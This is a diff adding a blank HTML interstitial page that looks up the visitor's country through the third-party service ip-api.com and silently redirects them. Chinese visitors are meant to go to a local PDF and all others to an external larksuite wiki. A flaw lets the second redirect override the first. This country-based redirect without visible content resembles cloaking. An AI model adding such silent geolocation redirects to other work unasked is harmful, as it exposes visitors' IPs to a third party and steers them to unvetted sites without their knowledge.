@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>einen Moment, bitte!</title>
+
+    <script>
+        var endpoint = 'http://ip-api.com/json/?fields=status,message,countryCode';
+
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function () {
+            if (this.readyState === 4 && this.status === 200) {
+                const response = JSON.parse(this.responseText);
+                if (response.status !== 'success') {
+                    alert('query failed: ' + response.message);
+                    return
+                }
+                // Redirect
+                if (response.countryCode === "CN") {
+                    window.location.replace("guide.pdf");
+                }
+                window.location.replace("https://ifjphspdnc9.sg.larksuite.com/wiki/LJwkweC7FiMSg9kCqLelLpASg0c");
+            }
+        };
+        xhr.open('GET', endpoint, true);
+        xhr.send();
+    </script>
+</head>
+<body>
+
+</body>
+</html>
